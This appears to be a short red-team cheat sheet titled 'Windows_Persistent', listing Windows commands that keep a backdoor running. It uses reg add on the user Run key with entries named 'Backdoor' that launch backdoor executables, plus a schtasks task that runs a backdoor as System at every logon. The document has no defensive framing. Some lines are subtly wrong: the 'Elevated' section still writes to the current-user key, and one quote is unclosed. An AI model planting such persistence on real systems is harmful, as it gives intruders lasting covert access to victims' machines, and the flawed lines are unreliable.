# Windows_Persistent

### Registry
```
#Userland AutoRun Persistence:
reg query "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run

reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\Public\meme.exe

#Elevated AutoRun Persistence:
reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v Backdoor /t REG_SZ /d C:\Users\miller\Desktop\PurpleHaze\backdoor.exe

reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PwC /t REG_SZ /d "C:\Windows\System32\cmd.exe" #Command Line 
reg add "HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run" /v PwC /t REG_SZ /d "C:\Windows\System32\cmd.exe"
schtasks /create /tn PwC2 /tr "c:\windows\system32\cmd.exe /c c:\Users\JOHN\Downloads\backdoor.exe" /sc onlogon /ru System #Command Line 

```
